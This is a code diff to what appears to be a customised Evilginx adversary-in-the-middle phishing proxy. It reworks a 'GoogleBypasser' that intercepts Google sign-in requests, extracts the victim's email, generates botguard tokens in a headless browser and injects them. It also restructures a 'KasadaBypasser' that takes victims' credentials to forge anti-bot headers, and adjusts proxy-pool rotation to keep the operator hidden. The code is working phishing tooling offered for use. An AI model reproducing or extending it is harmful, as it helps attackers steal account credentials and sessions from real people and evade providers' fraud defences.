@@ -365,8 +365,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	SetProxyPoolEnabledCallback(func(enabled bool) {
 		if enabled {
 			// For pool-based per-request selection, ensure no global dialer is set
+			// This is CRITICAL: pool and global proxy are mutually exclusive
 			p.Proxy.Tr.Dial = nil
 			log.Success("[ProxyPool] Pool enabled. Using per-request proxy selection.")
+			// Do NOT apply global proxy when pool is enabled - they conflict!
 			return
 		}
 
@@ -475,40 +477,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			// ============================================================================
-			// PRE-GENERATION ENDPOINT HANDLER (x33fcon optimization)
-			// Handles /.evilginx/pregen POST requests from JS injection
-			// This allows pre-generating botguard tokens BEFORE user clicks Next
+			// REMOVED PRE-GENERATION ENDPOINT
+			// No longer using async pre-generation to avoid hanging issues
+			// Bypasser now works synchronously when MI613e request arrives
 			// ============================================================================
-			if req.URL.Path == "/.evilginx/pregen" && req.Method == "POST" {
-				body, err := ioutil.ReadAll(req.Body)
-				if err != nil {
-					log.Warning("[PreGen] Failed to read request body: %v", err)
-					return req, goproxy.NewResponse(req, goproxy.ContentTypeText, http.StatusBadRequest, "Bad Request")
-				}
-				req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
-
-				var preGenData struct {
-					Email string `json:"email"`
-				}
-				if err := json.Unmarshal(body, &preGenData); err != nil {
-					log.Warning("[PreGen] Failed to decode request: %v", err)
-					return req, goproxy.NewResponse(req, goproxy.ContentTypeText, http.StatusBadRequest, "Bad Request")
-				}
-
-				email := preGenData.Email
-				if email == "" || !strings.Contains(email, "@") {
-					log.Warning("[PreGen] Invalid email in request: %s", email)
-					return req, goproxy.NewResponse(req, goproxy.ContentTypeText, http.StatusBadRequest, "Invalid email")
-				}
-
-				log.Info("[PreGen] 🚀 Pre-generation request for: %s", email)
-
-				// Start pre-generation in background (don't block)
-				go PreGenerateToken(email)
-
-				// Return success immediately
-				return req, goproxy.NewResponse(req, "application/json", http.StatusOK, `{"status":"started"}`)
-			}
 
 			log.Debug("**--** Request path: %s", req.URL.Path)
 
@@ -1468,71 +1440,30 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											} else {
 												decodedBodyBytes := []byte(decodedBody)
 
-												// Extract email from request body
-												emailRegexp := regexp.MustCompile(`f\.req=\[\[\["MI613e","\[null,\\"(.*?)\\"`)
-												emailMatch := emailRegexp.FindSubmatch(decodedBodyBytes)
-												var email string
-												if len(emailMatch) >= 2 {
-													email = string(bytes.Replace(emailMatch[1], []byte("%40"), []byte("@"), -1))
-													log.Info("[GoogleBypasser] Intercepted MI613e request for email: %s", email)
+												// ============================================================================
+												// SIMPLIFIED SYNCHRONOUS FLOW
+												// No caching, no async - just launch browser and get token
+												// This is the proven working approach from ProfGinx-V8
+												// ============================================================================
+												log.Info("[GoogleBypasser] MI613e request detected, generating token...")
+
+												b := &GoogleBypasser{
+													isHeadless:     true,
+													withDevTools:   false,
+													slowMotionTime: 0,
 												}
 
-												// OPTIMIZATION: Check if we have a cached token (from pre-generation)
-												if email != "" {
-													if cachedToken, found := GetCachedToken(email); found {
-														log.Success("[GoogleBypasser] 🚀 Using PRE-GENERATED token for: %s", email)
-														b := &GoogleBypasser{}
-														b.token = cachedToken
-														decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
+												// Launch fresh browser instance
+												b.Launch()
+												defer b.Close()
 
-														postForm, err := url.ParseQuery(string(decodedBodyBytes))
-														if err != nil {
-															log.Error("Failed to parse form data: %v", err)
-														} else {
-															body = []byte(postForm.Encode())
-															req.ContentLength = int64(len(body))
-														}
-														req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
-													} else {
-														// No cached token - generate one now (slower path)
-														log.Warning("[GoogleBypasser] No cached token, generating now for: %s", email)
+												// Extract email and get token
+												b.GetEmail(decodedBodyBytes)
+												b.GetToken()
 
-														b := &GoogleBypasser{
-															isHeadless:     true,
-															withDevTools:   false,
-															slowMotionTime: 500,
-														}
-														b.Launch()
-														b.email = email
-														b.GetToken()
-
-														if b.token != "" {
-															decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
-															postForm, err := url.ParseQuery(string(decodedBodyBytes))
-															if err != nil {
-																log.Error("Failed to parse form data: %v", err)
-															} else {
-																body = []byte(postForm.Encode())
-																req.ContentLength = int64(len(body))
-															}
-															log.Success("[GoogleBypasser] Token generated and injected for: %s", email)
-														} else {
-															log.Error("[GoogleBypasser] Failed to generate token for: %s", email)
-														}
-														req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
-													}
-												} else {
-													// Fallback to original method if email extraction failed
-													b := &GoogleBypasser{
-														isHeadless:     true,
-														withDevTools:   false,
-														slowMotionTime: 500,
-													}
-													b.Launch()
-													b.GetEmail(decodedBodyBytes)
-													b.GetToken()
+												// Replace token in body if we got one
+												if b.token != "" {
 													decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
-
 													postForm, err := url.ParseQuery(string(decodedBodyBytes))
 													if err != nil {
 														log.Error("Failed to parse form data: %v", err)
@@ -1540,8 +1471,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 														body = []byte(postForm.Encode())
 														req.ContentLength = int64(len(body))
 													}
-													req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+													log.Success("[GoogleBypasser] ✅ Token injected successfully")
+												} else {
+													log.Error("[GoogleBypasser] ❌ Failed to generate token")
 												}
+
+												req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 											}
 										}
 
@@ -1557,13 +1492,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 											if err := k.Launch(); err != nil {
 												log.Error("[KasadaBypasser]: Failed to launch browser: %v", err)
-											} else if err := k.GetCredentials(body); err != nil {
-												log.Error("[KasadaBypasser]: Failed to get credentials: %v", err)
-											} else if err := k.GetKasadaTokens(); err != nil {
-												log.Error("[KasadaBypasser]: Failed to get Kasada tokens: %v", err)
 											} else {
-												k.InjectKasadaHeaders(req)
-												log.Info("[KasadaBypasser]: Successfully injected Kasada headers for user: %s", k.username)
+												defer k.Close() // Ensure browser is closed
+												if err := k.GetCredentials(body); err != nil {
+													log.Error("[KasadaBypasser]: Failed to get credentials: %v", err)
+												} else if err := k.GetKasadaTokens(); err != nil {
+													log.Error("[KasadaBypasser]: Failed to get Kasada tokens: %v", err)
+												} else {
+													k.InjectKasadaHeaders(req)
+													log.Info("[KasadaBypasser]: Successfully injected Kasada headers for user: %s", k.username)
+												}
 											}
 										}
 									}
@@ -3480,6 +3418,18 @@ func (p *HttpProxy) handleProxyConfig(req *http.Request) (*http.Request, *http.R
 		}
 		if cfgReq.Enabled != nil {
 			p.cfg.EnableProxy(*cfgReq.Enabled)
+		}
+
+		// Apply proxy settings immediately ONLY if proxy pool is NOT enabled
+		// If pool is enabled, global proxy should not interfere
+		poolEnabled := p.anonymityEngine != nil && p.anonymityEngine.proxyRotator != nil && p.anonymityEngine.proxyRotator.IsEnabled()
+
+		if poolEnabled {
+			// Pool is active - don't apply global proxy as they conflict
+			log.Info("[ProxyPool] Proxy pool enabled, single proxy config saved but not applied to Tr.Dial")
+			resp := goproxy.NewResponse(req, "application/json", http.StatusOK,
+				`{"status":"ok","message":"Proxy config saved (pool is active)"}`)
+			return req, resp
 		}
 
 		// Apply proxy settings immediately (no restart required!)
